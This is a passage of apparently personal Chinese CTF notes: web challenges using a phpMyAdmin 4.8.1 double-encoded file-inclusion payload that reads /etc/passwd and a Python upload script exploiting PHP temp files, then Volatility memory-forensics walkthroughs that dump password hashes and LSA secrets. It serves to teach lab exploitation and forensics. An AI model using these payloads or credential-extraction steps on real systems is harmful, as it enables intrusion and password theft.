进来并没有发现什么可用的东西，然后按惯例就需要进一步做目录爆破

<img src="CTF.assets/image-20231123163226294.png" alt="image-20231123163226294" style="zoom: 67%;" />

一般来讲是可以爆破得到`phpmyadmin`目录的，但是由于`buuoj`平台不允许，所以这里只能看了一下wp，发现存在目录`phpmyadmin`

<img src="CTF.assets/image-20231123163415025.png" alt="image-20231123163415025" style="zoom:67%;" />

进来之后查看`phpmyadmin`的版本信息为：` 4.8.1`，搜索了一下这个版本存在文件包含漏洞

**漏洞原因：phpMyadmin 4.8.1版本的index.php中存在文件包含漏洞，通过 二次url编码 即可绕过过滤。**

```
/* 方法一 */
http://localhost:8088/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd

/* 方法二 */
http://localhost:8088/phpmyadmin/index.php?target=db_datadict.php%253f/../../../../../../../../../Windows/DATE.ini
```

以此payload包含：`/flag`即可

```
http://localhost:8088/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../flag
flag{338f8ad6-ae9d-46d0-baea-197cd64dd18b}
```

![image-20231123163825303](CTF.assets/image-20231123163825303.png)

## BUUOJ [NPUCTF2020]ezinclude

进来查看源码可以看到一段提示，但是这个基本是`md5 === `是不能爆破出来的，后面看了一下wp，并拿到源码

![image-20240222160659863](CTF.assets/image-20240222160659863.png)

其实这里的逻辑就很奇怪，就是下一个相应包的Hash就是你的`pass`，就看你能不能猜到了

```php
index.php
<?php
include 'config.php';
@$name=$_GET['name'];
@$pass=$_GET['pass'];
if(md5($secret.$name)===$pass){
    echo '<script language="javascript" type="text/javascript">
           window.location.href="flflflflag.php";
	</script>
';
}else{
    setcookie("Hash",md5($secret.$name),time()+3600000);
    echo "username/password error";
}
?>
<html>
<!--md5($secret.$name)===$pass -->
</html>

```

以此得到下一个网页并访问可以，且能直接使用`php://filter`拿到所有的源码

![image-20240222161003674](CTF.assets/image-20240222161003674.png)

```php
# flflflflag.php
<html>
<head>
    <script language="javascript" type="text/javascript">
        window.location.href="404.html";
    </script>
    <title>this_is_not_fl4g_and_出题人_wants_girlfriend</title>
</head>
<>
<body>
<?php
$file=$_GET['file'];
if(preg_match('/data|input|zip/is',$file)){
    die('nonono');
}
@include($file);
echo 'include($_GET["file"])';
?>
</body>
</html>

```

后面是利用`php7.0的bug`做一个上传webshell的操作了，可以参考下面这两个链接；简单来说就是：

1. 如果没有上传口，只要我们构造出一个正确的POST数据包，我们也可以做文件上传操作
2. 以这种方法上传的文件，由于PHP脚本没有做移动保存处理，所以只会存在`5s`，5秒后自动删除
3. 在这5s的时间里，如果PHP崩溃或者清空内存栈的话，那么这个文件就会永久存在

> - [PHP临时文件机制与利用的思考 - linuxsec - 博客园 (cnblogs.com)](https://www.cnblogs.com/linuxsec/articles/11278477.html)
> - [关于php文件操作的几个小trick - tr1ple - 博客园 (cnblogs.com)](https://www.cnblogs.com/tr1ple/p/11301743.html)

根据上面的思路，我们只要让PHP崩溃的同时上传shell文件，再回来使用`include`函数包含，就可以成功运行木马了

```python
import requests
from io import BytesIO

base_url = 'http://69b82027-d496-4ad5-8b6f-dbf95b056356.node5.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd'

payload = '<?php phpinfo()?>'
data = {
    'file': BytesIO(payload.encode())           # 将字符串转换为字节流
}

req = requests.post(base_url, files=data)       # 这里需要使用 files 关键字而不是 data 关键字
print(req.text)
```

最后直接在浏览器访问这个链接：`http://69b82027-d496-4ad5-8b6f-dbf95b056356.node5.buuoj.cn:81/flflflflag.php?file=/tmp/phpTkQIkF`并抓相应包就能看到FLAG了，不要用Burp Suite的重放，相应包好像回不来



# 数字取证

## 1. 不知道哪里的题目

> 内存文件下载连接：链接：https://pan.baidu.com/s/1xEV5bnB12C_qYp3fTb98Lg?pwd=q8rr 提取码：q8rr
>
> 工具 Volatility 自行下载安装

**1.1 分析镜像文件**

```bash
┌──(pinginglab㉿pinginglab)-[~/桌面/Cliente]
└─$ vol.py -f mem.dump imageinfo                                                
Volatility Foundation Volatility Framework 2.6.1
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418
                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
                     AS Layer2 : FileAddressSpace (/home/pinginglab/桌面/Cliente/mem.dump)
                      PAE type : No PAE
                           DTB : 0x187000L
                          KDBG : 0xf80003e02110L
          Number of Processors : 1
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0xfffff80003e03d00L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2019-11-13 08:39:44 UTC+0000
     Image local date and time : 2019-11-13 16:39:44 +0800
```

**1.2 常规进程分析**

这里直接使用`Win7SP1x64`就好，可以看到启动了cmd

```bash
┌──(pinginglab㉿pinginglab)-[~/桌面/Cliente]
└─$ vol.py -f mem.dump --profile=Win7SP1x64 pslist |grep cmd  
Volatility Foundation Volatility Framework 2.6.1
0xfffffa800ea75b10 cmd.exe                2260   2316      1       20      1      0 2019-11-13 08:33:45 UTC+0000
```

**1.3 分析cmd**

```bash
┌──(pinginglab㉿pinginglab)-[~/桌面/Cliente]
└─$ vol.py -f mem.dump --profile=Win7SP1x64 --help |grep "cmd"
Volatility Foundation Volatility Framework 2.6.1
  cmdline         Display process command-line arguments
  cmdscan         Extract command history by scanning for _COMMAND_HISTORY

┌──(pinginglab㉿pinginglab)-[~/桌面/Cliente]
└─$ vol.py -f mem.dump --profile=Win7SP1x64 cmdscan             
Volatility Foundation Volatility Framework 2.6.1
**************************************************
CommandProcess: conhost.exe Pid: 2632
CommandHistory: 0x242350 Application: cmd.exe Flags: Allocated, Reset
CommandCount: 1 LastAdded: 0 LastDisplayed: 0
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x60
# 这里发现提示，flag.ccx密码是管理员的密码
Cmd #0 @ 0x2229d0: flag.ccx_password_is_same_with_Administrator 
**************************************************
CommandProcess: conhost.exe Pid: 2748
CommandHistory: 0x2926d0 Application: DumpIt.exe Flags: Allocated
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x60
```

**1.4 解密管理员密码**

Windows 的密码是保存在SAM文件中的，`hashdump`下载哈希

1. **用户名**：在这个例子中是`Administrator`。
2. **用户ID**：在这个例子中是`500`。
3. **LM散列**：在这个例子中是`6377a2fdb0151e35b75e0c8d76954a50`。
4. **NTLM散列**：在这个例子中是`0d546438b1f4c396753b4fc8c8565d5b`。
5. **评论**：在这个例子中为空。
6. **主目录**：在这个例子中为空。

```bash
┌──(pinginglab㉿pinginglab)-[~/桌面/Cliente]
└─$ vol.py -f mem.dump --profile=Win7SP1x64 hashdump
Volatility Foundation Volatility Framework 2.6.1
Administrator:500:6377a2fdb0151e35b75e0c8d76954a50:0d546438b1f4c396753b4fc8c8565d5b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

**1.5 CMD5解密获得密码**

<img src="CTF.assets/image-20230618175456601.png" alt="image-20230618175456601" style="zoom:50%;" />

**1.6 寻找flag.cxx文件**

```bash
┌──(pinginglab㉿pinginglab)-[~/桌面/Cliente]
└─$ vol.py -f mem.dump --profile=Win7SP1x64 filescan |grep "flag"
Volatility Foundation Volatility Framework 2.6.1
0x000000003e435890     15      0 R--rw- \Device\HarddiskVolume2\Users\Administrator\Desktop\flag.ccx
```

**1.7 下载文件**

```bash
┌──(pinginglab㉿pinginglab)-[~/桌面/Cliente]
└─$ vol.py -f mem.dump --profile=Win7SP1x64 dumpfiles -Q 0x000000003e435890 -D .
Volatility Foundation Volatility Framework 2.6.1
DataSectionObject 0x3e435890   None   \Device\HarddiskVolume2\Users\Administrator\Desktop\flag.ccx
```

**1.8 加密磁盘挂载**

成功提取出文件，根据查询ccx可以使用挂载系统加密卷的方式进行访问，可以使用CnCrypt进行加载

<img src="CTF.assets/image-20230618175947500.png" alt="image-20230618175947500" style="zoom:50%;" />

**1.9 获取flag**

<img src="CTF.assets/image-20230618180040413.png" alt="image-20230618180040413" style="zoom:50%;" />

## [otterctf] What the password-查找用户密码

**1. 使用hashdump查看用户哈希**

尝试放在其他在线解密网站，但是无法成功解密

```
┌──(pinginglab㉿pinginglab)-[~/桌面]
└─$ vol.py -f OtterCTF.vmem --profile=Win7SP1x64 hashdump                                            
Volatility Foundation Volatility Framework 2.6.1
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Rick:1000:aad3b435b51404eeaad3b435b51404ee:518172d012f97d3a8fcc089615283940:::
```

**2. 使用lasdump解密哈希**

lsadump：从注册表中提取LSA密钥信息,显示加密以后的数据用户密码

```
┌──(pinginglab㉿pinginglab)-[~/桌面]
└─$ vol.py -f OtterCTF.vmem --profile=Win7SP1x64 lsadump 
Volatility Foundation Volatility Framework 2.6.1
DefaultPassword
0x00000000  28 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   (...............
0x00000010  4d 00 6f 00 72 00 74 00 79 00 49 00 73 00 52 00   M.o.r.t.y.I.s.R.
0x00000020  65 00 61 00 6c 00 6c 00 79 00 41 00 6e 00 4f 00   e.a.l.l.y.A.n.O.
0x00000030  74 00 74 00 65 00 72 00 00 00 00 00 00 00 00 00   t.t.e.r.........
```

```
 flag:CTF{MortyIsReallyAnOtter}
```

## [otterctf] General Info-查找IP地址和主机名

**netscan 查看IP地址**

==netscan=netstat==

```
┌──(pinginglab㉿pinginglab)-[~/桌面]
└─$ vol.py -f OtterCTF.vmem --profile=Win7SP1x64 netscan
Volatility Foundation Volatility Framework 2.6.1
Offset(P)          Proto    Local Address                  Foreign Address      State            Pid      Owner          Created
0x7d60f010         UDPv4    0.0.0.0:1900                   *:*                                   2836     BitTorrent.exe 2018-08-04 19:27:17 UTC+0000
0x7d62b3f0         UDPv4    192.168.202.131:6771           *:*                                   2836     BitTorrent.exe 2018-08-04 19:27:22 UTC+0000
0x7d62f4c0         UDPv4    127.0.0.1:62307                *:*                                   2836     BitTorrent.exe 2018-08-04
```

```
 flag:CTF{192.168.202.131}
```

**查看主机名**

主机名等计算机相关信息都会保存在注册表中

```bash
# 查看注册表
┌──(pinginglab㉿pinginglab)-[~/桌面]
└─$ vol.py -f OtterCTF.vmem --profile=Win7SP1x64  hivelist
Volatility Foundation Volatility Framework 2.6.1
Virtual            Physical           Name
------------------ ------------------ ----
0xfffff8a00377d2d0 0x00000000624162d0 \??\C:\System Volume Information\Syscache.hve
0xfffff8a00000f010 0x000000002d4c1010 [no name]
0xfffff8a000024010 0x000000002d50c010 \REGISTRY\MACHINE\SYSTEM
0xfffff8a000053320 0x000000002d5bb320 \REGISTRY\MACHINE\HARDWARE
0xfffff8a000109410 0x0000000029cb4410 \SystemRoot\System32\Config\SECURITY
0xfffff8a00033d410 0x000000002a958410 \Device\HarddiskVolume1\Boot\BCD
0xfffff8a0005d5010 0x000000002a983010 \SystemRoot\System32\Config\SOFTWARE
0xfffff8a001495010 0x0000000024912010 \SystemRoot\System32\Config\DEFAULT
0xfffff8a0016d4010 0x00000000214e1010 \SystemRoot\System32\Config\SAM
0xfffff8a00175b010 0x00000000211eb010 \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT
0xfffff8a00176e410 0x00000000206db410 \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT
0xfffff8a002090010 0x000000000b92b010 \??\C:\Users\Rick\ntuser.dat
0xfffff8a0020ad410 0x000000000db41410 \??\C:\Users\Rick\AppData\Local\Microsoft\Windows\UsrClass.dat

# 主机名一般保存在SYSTEM中
# 这里显示的是SYSTEM下的子键，继续向下找
┌──(pinginglab㉿pinginglab)-[~/桌面]
└─$ vol.py -f OtterCTF.vmem --profile=Win7SP1x64  -o 0xfffff8a000024010 printkey
Volatility Foundation Volatility Framework 2.6.1
Legend: (S) = Stable   (V) = Volatile

----------------------------
Registry: \REGISTRY\MACHINE\SYSTEM
Key name: CMI-CreateHive{2A7FB991-7BBE-4F9D-B91E-7CB51D4737F5} (S)
Last updated: 2018-08-04 19:25:54 UTC+0000

Subkeys:
  (S) ControlSet001
  (S) ControlSet002
  (S) MountedDevices
  (S) RNG
  (S) Select
  (S) Setup
  (S) Software
  (S) WPA
  (V) CurrentControlSet

Values:

# 继续向下找
┌──(pinginglab㉿pinginglab)-[~/桌面]
└─$ vol.py -f OtterCTF.vmem --profile=Win7SP1x64  -o 0xfffff8a000024010 -K "ControlSet001" printkey
Volatility Foundation Volatility Framework 2.6.1
Legend: (S) = Stable   (V) = Volatile

----------------------------
Registry: \REGISTRY\MACHINE\SYSTEM
Key name: ControlSet001 (S)
Last updated: 2018-06-02 19:23:00 UTC+0000

Subkeys:
  (S) Control
  (S) Enum
  (S) Hardware Profiles
  (S) Policies
  (S) services

Values:


# 继续向下找
┌──(pinginglab㉿pinginglab)-[~/桌面]
└─$ vol.py -f OtterCTF.vmem --profile=Win7SP1x64  -o 0xfffff8a000024010 -K "ControlSet001\\Control" printkey
Volatility Foundation Volatility Framework 2.6.1
Legend: (S) = Stable   (V) = Volatile

----------------------------
Registry: \REGISTRY\MACHINE\SYSTEM
Key name: Control (S)
Last updated: 2018-08-04 19:26:03 UTC+0000

Subkeys:
  (S) ACPI
  (S) AGP
  (S) AppID
  (S) Arbiters
  (S) BackupRestore
  (S) Class
  (S) CMF
  (S) CoDeviceInstallers
  (S) COM Name Arbiter
  (S) ComputerName
  
 # 继续向下找
 ┌──(pinginglab㉿pinginglab)-[~/桌面]
└─$ vol.py -f OtterCTF.vmem --profile=Win7SP1x64  -o 0xfffff8a000024010 -K "ControlSet001\\Control\\ComputerName" printkey
Volatility Foundation Volatility Framework 2.6.1
Legend: (S) = Stable   (V) = Volatile

----------------------------
Registry: \REGISTRY\MACHINE\SYSTEM
Key name: ComputerName (S)
Last updated: 2018-08-04 19:26:11 UTC+0000

Subkeys:
  (S) ComputerName
  (V) ActiveComputerName

Values:

# 发现主机名：WIN-LO6FAF3DTFE
┌──(pinginglab㉿pinginglab)-[~/桌面]
└─$ vol.py -f OtterCTF.vmem --profile=Win7SP1x64  -o 0xfffff8a000024010 -K "ControlSet001\\Control\\ComputerName\\ComputerName" printkey
Volatility Foundation Volatility Framework 2.6.1
Legend: (S) = Stable   (V) = Volatile

----------------------------
Registry: \REGISTRY\MACHINE\SYSTEM
Key name: ComputerName (S)
Last updated: 2018-06-02 19:23:00 UTC+0000

Subkeys:

Values:
REG_SZ                        : (S) mnmsrvc
REG_SZ        ComputerName    : (S) WIN-LO6FAF3DTFE

```

```
flag:CTF{WIN-LO6FAF3DTFE}
```

## [otterctf] Silly Rick-查看剪贴板内容

**查看粘贴板**

```
┌──(pinginglab㉿pinginglab)-[~/桌面]
└─$ vol.py -f OtterCTF.vmem --profile=Win7SP1x64 clipboard
Volatility Foundation Volatility Framework 2.6.1
Session    WindowStation Format                         Handle Object             Data                                              
---------- ------------- ------------------ ------------------ ------------------ --------------------------------------------------
         1 WinSta0       CF_UNICODETEXT                0x602e3 0xfffff900c1ad93f0 M@il_Pr0vid0rs                                    
         1 WinSta0       CF_TEXT                          0x10 ------------------                                                   
         1 WinSta0       0x150133L              0x200000000000 ------------------                                                   
         1 WinSta0       CF_TEXT                           0x1 ------------------                                                   
         1 ------------- ------------------           0x150133 0xfffff900c1c1adc0 
```

## [otterctf] Hide And Seek-查找病毒

这里发现一个可疑程：`mware-tray.ex`，父进程是：`Rick And Morty`

```bash
┌──(pinginglab㉿pinginglab)-[~/桌面]
└─$ vol.py -f OtterCTF.vmem --profile=Win7SP1x64 pslist         
Volatility Foundation Volatility Framework 2.6.1
Offset(V)          Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit                          
------------------ -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ -----------------
0xfffffa801b486b30 Rick And Morty         3820   2728      4      185      1      1 2018-08-04 19:32:55 UTC+0000                                 
0xfffffa801a4c5b30 vmware-tray.ex         3720   3820      8      147      1      1 2018-08-04 19:33:02 UTC+0000   
```

使用`dlllist`查看程序的动态链接库，可发现是在TEMP路径下执行的

```
┌──(pinginglab㉿pinginglab)-[~/桌面]
└─$ vol.py -f OtterCTF.vmem --profile=Win7SP1x64 dlllist -p 3720
Volatility Foundation Volatility Framework 2.6.1
************************************************************************
vmware-tray.ex pid:   3720
Command line : "C:\Users\Rick\AppData\Local\Temp\RarSFX0\vmware-tray.exe" 

```

